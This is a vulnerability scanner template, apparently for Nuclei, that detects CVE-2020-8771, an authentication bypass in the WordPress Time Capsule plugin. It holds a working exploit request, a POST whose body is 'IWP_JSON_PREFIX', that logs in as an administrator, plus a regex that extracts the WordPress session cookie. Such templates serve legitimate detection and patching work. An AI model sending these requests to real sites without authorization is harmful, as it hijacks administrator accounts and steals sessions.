id: CVE-2020-8771
info:
  name: WordPress Time Capsule < 1.21.16 - Authentication Bypass
  author: princechaddha
  severity: critical
  description: The WordPress Time Capsule plugin has an authentication bypass vulnerability
    that allows a client to log in as the first account on the list of administrator
    accounts by sending a request containing IWP_JSON_PREFIX.
  reference:
  - https://github.com/SECFORCE/WPTimeCapsulePOC
  - https://nvd.nist.gov/vuln/detail/CVE-2020-8771
  - https://wpvulndb.com/vulnerabilities/10010
  - https://www.webarxsecurity.com/vulnerability-infinitewp-client-wp-time-capsule/
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2020-8771
    cwe-id: CWE-287
  tags: cve,cve2020,wordpress,wp-plugin
  metadata:
    impact: The authentication bypass found in the WordPress Time Capsule plugin can
      potentially provide unauthorized access to administrator accounts, resulting
      in significant security implications.
    recommendation: It is recommended to update WordPress Time Capsule plugin to version
      1.21.16 or higher to avoid the authentication bypass vulnerability (CVE-2020-8771).
requests:
- raw:
  - 'POST / HTTP/1.1

    Host: {{Hostname}}

    Connection: close

    Accept: */*


    IWP_JSON_PREFIX

    '
  - 'GET /wp-admin/index.php HTTP/1.1

    Host: {{Hostname}}

    Connection: close

    Accept: */*

    '
  cookie-reuse: true
  matchers-condition: and
  matchers:
  - type: word
    words:
    - <div id="adminmenumain" role="navigation" aria-label="Main menu">
    - <h1>Dashboard</h1>
    part: body
    condition: and
  - type: word
    words:
    - text/html
    part: header
  - type: status
    status:
    - 200
  extractors:
  - type: regex
    part: header
    regex:
    - wordpress_[a-z0-9]+=([A-Za-z0-9%]+)
